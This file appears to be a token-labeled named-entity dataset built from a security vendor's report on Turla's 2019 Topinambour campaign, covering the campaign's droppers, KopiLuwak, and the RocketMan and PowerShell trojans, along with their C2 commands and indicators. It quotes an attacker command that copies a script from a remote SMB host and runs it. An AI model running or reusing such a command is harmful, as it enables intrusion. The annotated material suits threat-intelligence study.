Turla renews its arsenal with Topinambour Release_Time :J uly 15 , 2019 .		threatActor_name others others others others others others others others others others others others others
10:00 am Report_URL :h ttps://securelist.com/turla-renews-its-arsenal-with-topinambour/91687/ Turla , also known as Venomous Bear , Waterbug , and Uroboros , is a Russian speaking threat actor known since 2014 , but with roots that go back to 2004 and earlier .		others others others others others others others others threatActor_name others others others others threatActor_aliases threatActor_aliases others threatActor_aliases others others threatActor_aliases others others others location others others others others others time others others others others others others others others time others others others
It is a complex cyberattack platform focused predominantly on diplomatic and government-related targets , particularly in the Middle East , Central and Far East Asia , Europe , North and South America and former Soviet bloc nations .		others others others others others others others others others government others government others others others others location location location others location others location location location others location others location location location location others location location location location others
2019 has seen the Turla actor actively renew its arsenal .		time others others others threatActor_name others others others others others others
Here we ’ll tell you about several of them , namely “ Topinambour ” ( aka Sunchoke – the Jerusalem artichoke ) and its related modules .		others others others others others others others others others others others others others malware others others malware malware others others others others others others others others others others
We didn’t choose to name it after a vegetable ; the .NET malware developers named it Topinambour themselves .		others others others others others others others others others others others others others tool others others others others malware others others
The new modules were used in an active campaign that started at the beginning of 2019 .		others others others others others others others others others others others others others others others time others
As usual , the actor targeted governmental entities .		others others others others others others government others others
The role of the .NET module is to deliver the known KopiLuwak JavaScript Trojan .		others others others others tool others others others others others others malware tool malware others
Moreover , this actor now also has a heavily obfuscated PowerShell Trojan that is similar to KopiLuwak .		others others others others others others others others others others tool malware others others others others malware others
Among the control servers there are several legitimate but compromised WordPress websites with the actor ’s .php scripts on them .		others others others others others others others others others others tool others others others others others others program_language program_language others others others
This time , the developers left some Easter eggs for the targets and researchers .		others others others others others others others others others others others others others others others
The .NET modules include amusing strings such as “ TrumpTower ” as an initial vector for RC4 encryption .		others tool others others others others others others others string others others others others others others encryption_algo encryption_algo others
“ RocketMan!		others string others
” ( probably a reference to Donald Trump ’s nickname for Kim Jong Un ) and “ MiamiBeach ” serve as the first beacon messages from the victim to the control server .		others others others others others others others others others others others others others others others others others others string others others others others others others others others others others others others others others others
To deliver all this to targets , the operators use legitimate software installers infected with the Topinambour dropper .		others others others others others others others others others others others others others others others others attack_activity attack_activity others
These could be tools to circumvent internet censorship , such as “ Softether VPN 4.12 ” and “ psiphon3 ” , or Microsoft Office “ activators ” .		others others others others others others others others others others others others counter_measure counter_measure counter_measure others others others counter_measure others others others tool tool others counter_measure others others
The dropper contains a tiny .NET shell that will wait for Windows shell commands from the operators .		tool tool others others others tool tool others others others others tool tool others others others others others
Using this and SMB shares on rented virtual private servers ( VPS ) , the campaign operators spread the next-stage modules using just “ net use ” and “ copy ” Windows shell commands .		others others others protocol others others others tool tool tool tool tool tool others others others others others others others others others others others others others others others others others others tool tool others others
It ’s hard to believe , but SMB still works through public networks .		others others others others others others others others protocol others others others others others others
These campaign-related VPSs are located in South Africa .		others others tool others others others location location others
Interestingly , their external IP addresses start with “ 197.168 ” .		others others others others others others others others others IP_evil others others
Possibly these first two bytes are there to mimic LAN addresses that start with “ 192.168 ” .		others others others others others others others others others others others others others others others IP others others
Lateral movements in the target ’s infrastructure show how familiar the campaign operators are with the IPv6 protocol .		others others others others others others others others others others others others others others others others others protocol others others
Along with IPv4 they use the newer version for shell commands and LAN addresses .		others others protocol others others others others others others others others others others others others
The purpose of all this infrastructure and modules in JavaScript , .NET and PowerShell is to build a “ fileless ” module chain on the victim ’s computer consisting of an initial small runner and several Windows system registry values containing the encrypted remote administration tool .		others others others others others others others others others tool others tool others tool others others others others others others others others others others others others others others others others others others others others others others others OS_name others others others others others others others others others others
The tool does all that a typical Trojan needs to accomplish : upload , download and execute files , fingerprint target systems .		others others others others others others others others others others others others others others others others others others others others others others others
The PowerShell version of the Trojan also has the ability to get screenshots .		others tool others others others others others others others others others others others others
JavaScript exit upld inst wait dwld .		malware others others others others others others
.NET #down #upload #timeout #stop #sync .		tool others others others others others others others others others others others
PowerShell #upload #down #screen #timeout #stop #sync .		tool others others others others others others others others others others others others others
Our analysis of the dropper is based on the sample below :  SHA256 8bcf125b442f86d24789b37ce64d125b54668bc4608f49828392b5b66e364284 MD5 110195ff4d7298ba9a186335c55b2d1f Compiled 2018.09.10 12:08:14 ( GMT ) Size 1 159 680 Original name topinambour.exe .		others others others others others others others others others others others others others sha2 others md5 others time time others others others others others others others others others sample_name others
The dropper sample on which our analysis is based implements the following features :  unpack_p Drops payload to %LOCALAPPDATA%/VirtualStore/certcheck.exe .		others others others others others others others others others others others others others others others others others others others others others others others
The “ p ” in the function name and corresponding resource in the dropper stands for “ payload ” .		others others others others others others others others others others others others others others others others others others others others
make_some_noise Gains persistence for payload with a scheduled task that starts every 30 minutes .		function others others others others others others others others others others others others others others
unpack_o Drops the original application that the dropper tries to mimic ( such as psiphon3 ) to %TEMP%/activator.exe and runs it .		function others others others others others others others others others others others others others others others others others others others others others others others others
Here “ o ” in the function name and corresponding resource in the dropper stands for “ original ” .		others others others others others others others others others others others others others others others others others others others others
The tiny dropped application gets Windows shell commands from the C2 and silently executes them .		others others others others others tool tool others others others others others others others others others
The first DWORD ( four bytes ) received after a TCP request to the C2 is the data size for the following communication .		others others string others others others others others others others protocol others others others others others others others others others others others others others
Then the data contained in the next packets will be the Windows shell command to silently execute the application using “ cmd.exe /c ” .		others others others others others others others others others others others tool tool others others others others others others others others sample_name sample_name others others
And that ’s it – straightforward , simple and useful .		others others others others others others others others others others others others
This is where the notorious KopiLuwak comes into play .		others others others others others tool others others others others
The .NET remote shell silently downloads scripts from the C2 – from the opened SMB share on a remote CELL-C VPS in South Africa to be precise .		others tool others others others others others others others others others others others others protocol others others others others others tool others location location others others others others
“ Net use ” and “ copy ” Windows shell commands are enough to fulfil the task .		others others others others others others others others tool tool others others others others others others others others
cmd.exe /c net use \\197.168.0.247\c$ <user_pass_here> /user : administrator & copy /y \\197.168.0.247\c$\users\public\documents\i.js $documents\j.js & $documents\j.js As a result , the victim is infected with a KopiLuwak obfuscated JavaScript .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others malware others tool others
Its functions are described in the table below :  Create scheduler task Creates a task with the name ProactiveScan , description “ NTFS Volume Health Scan ” , which runs C:\Users\<user_name_here>\AppData\Roaming\Microsoft\Chkdsk.js with the parameters “ -scan Kdw6gG7cpOSZsBeH ” , where the parameter is the RC4 decryption key .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others tool others others others
Fingerprint host Saves a set of commands such as systeminfo , net view , tasklist /v , gpresult /z , dir \x22%programfiles%\x5cKaspersky Lab\x22 , tracert www.google.com to %appdata%\Microsoft\x5ct235.dat .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
Drop next JavaScript Drops C:\Users\<user_name_here>\AppData\Roaming\Microsoft\Chkdsk.js .		others others others others others others others others others others others others
The dropped “ Chkdsk.js ” decrypts one more script using the RC4 key provided in the dropper ’s scheduled task and runs the decrypted code .		others others others others others others others others others others others tool others others others others others others others others others others others others others others others
This final stager is a more complex Trojan , able to parse and execute custom commands from the C2 .		others others tool others others others others others others others others others others others others others others others others others
The operators get the victim ’s data in XML format : every message has a 16-byte signature at the beginning and a victim-specific fingerprint that the developer calls “ ridid ” .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
magic 16 Every encrypted message from the infected host starts with this .		others others others others others others others others others others others others others
In the samples described , the magic bytes are ‘ bYVAoFGJKj7rfs1M ’ .		others others others others others others others others others others string others others
ridid 32 Hash value , based on Windows installation date and the aforementioned 16-byte magic value RC4 iv 32 RC4 initial vector to encrypt communication between the target and the C2 .		others others others others others others others OS_name others others others others others others others others others others others others others others others others others others others others others others others others
In the samples described , the IV value is “ 01a8cbd328df18fd49965d68e2879433 ”  The malware communicates with a legitimate compromised WordPress-based website and gets four byte length commands from URL like “ http://<legitimate domain>/wp-includes/Requests/Socks.php ” .		others others others others others others others others others others encryption_algo others others others others others others others others tool others others others others others others others others others others others others others others others others others others others others others
First , the malware beacons to its C2 and gets the command to execute as an answer .		others others others others others others others others others others others others others others others others others others
exit Send “ t235.dat ” fingerprinting file content with “ upl ” text in the XML message , delete the file and stop script execution .		others others others others others others others others others others others others others others others others others others others others others others others others others others
upld Send “ t235.dat ” content with “ upl ” text in XML message .		others others others others others others others others others others others others others others others
If no such file exists , or it ’s empty , it sends “ opt file no exists or size limit ” text in the XML message .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
inst Command format is :  – three bytes after command – overall server response length – three following bytes – they are “ jss ”  – Tail – JavaScript to execute Send ‘ good install ’ and “ t235.dat ” content in the XML messages .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others tool others others others others others others others others others others others others others others others others others
Save executed JavaScript file as %APPDATA%\Microsoft\ghke94d.jss .		others others tool others others others others others others others
wait Do nothing .		others others others others
dwld Command format is the same as for the “ inst ” command , but the script from the server will not be executed at once .		others others others others others others others others others others others others others others others others others others others others others others others others others others others
It saves the decrypted JavaScript as %APPDATA%\Microsoft\awgh43.js and sends ‘ success get_parse_command ’ in the XML message .		others others others others tool others others others others others others others others function function others others others others others others
The downloaded script takes a binary from the Windows registry and runs it .		others others others others others others others others OS_name others others others others others
However , the attackers usually use the .NET initial infector for that .		others others others others others others others tool others others others others others
This is the end of first “ JavaScript ” infection chain .		others others others others others others others tool others others others others
We call this Trojan RocketMan after the string the developer uses for beaconing .		others others others others tool others others others others others others others others others
Another string inside this malware is “ TrumpTower ” , used as an RC4 encryption initial vector .		others others others others others others others string others others others others others others others others others others
This malware reads the C2 IP and port from the registry where it was saved by the previous stager .		others others others others others others others others others others others others others others others others others others others others
It processes the following commands from its C2 that are received encrypted over HTTP :  #down Make HTTP POST request to http://<config_ip> : <config_port>/file to download the file with the provided name to the victim ’s computer .		others others others others others others others others others others others others others others others others others others others others others others url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil others others others others others others others others others others others others others others others
#upload Make HTTP GET request to http://<config_ip> : <config_port>/update , decrypt server response and upload the file to the server with the provided path and name .		others others others others others others others url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil others others others others others others others others others others others others others others others others others others
#timeout Get the pause length from the server command argument and wait .		others others others others others others others others others others others others others others
#stop Make HTTP GET request to http://<config_ip> : <config_port>/exit , stop the Trojan operation .		others others others others others others others url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil others others others others others others
#sync Send encrypted “ RocketMan!		others others others others others string string
” string to the server .		others others others others others others
Last but not least , the developers behind the Topinambour campaign also used a PowerShell Trojan .		others others others others others others others others others others others others others others tool others others
This Trojan contains around 450 strings and uses “ TimesNewRoman ” as the RC4 initial vector to encrypt C2 communications .		others others others others others others others others others string others others others others others others others others others others others
This module beacons to its hardcoded C2 with the string “ MiamiBeach ” using an HTTP POST .		others others others others others others others others others others others others others others others others others others
The Trojan is quite similar to the .NET RocketMan Trojan and can handle the same commands ; additionally , it includes the “ #screen ” command to take a screenshot .		others others others others others others others tool tool others others others others others others others others others others others others others others others others others others others others others others others
The reason behind the development of KopiLuwak ’s PowerShell and .NET analogues may be simply to minimize detection of the well-known , publicly discussed JavaScript versions .		others others others others others others tool tool tool tool others tool tool others others others others others others others others others others others others tool others others
Using the Windows system registry to store encrypted data that is later used by the malware also seems to be aimed at minimizing detection and reducing the digital footprint on any victim ’s computer , where only a tiny starter would be left .		others others OS_name others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
It ’s a bit surprising , amusing and not entirely clear why the developers have used some seemingly US-related strings such as “ RocketMan!		others others others others others others others others others others others others others others others others others others others others others others others others string string
” , “ TrumpTower ” or “ make_some_noise ” .		others others others string others others others string others others
They are hardly likely to serve as false flags .		others others others others others others others others others others
The usage of KopiLuwak , a well-known and exclusive artefact previously used by the Turla group , makes us attribute this campaign to this actor with high confidence .		others others others tool others others others others others others others others others others threatActor_name others others others others others others others others others others others others others others
http://<config_ip> : <config_port>/file http://<config_ip> : <config_port>/update http://<config_ip> : <config_port>/exit .		url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil url_evil others
47870ff98164155f088062c95c448783 2c1e73da56f4da619c4c53b521404874 6acf316fed472300fa50db54fa6f3cbc 9573f452004b16eabd20fa65a6c2c1c4 3772a34d1b731697e2879bef54967332 d967d96ea5d0962e08844d140c2874e0 a80bbd753c07512b31ab04bd5e3324c2 37dc2eb8ee56aeba4dbd4cf46f87ae9a 710f729ab26f058f2dbf08664edb3986 .		sha1 sha1 sha1 sha1 sha1 sha1 sha1 sha1 sha1 others
197.168.0.73 197.168.0.98 197.168.0.212 197.168.0.243 197.168.0.247 197.168.0.250 .		IP_evil IP_evil IP_evil IP_evil IP_evil IP_evil others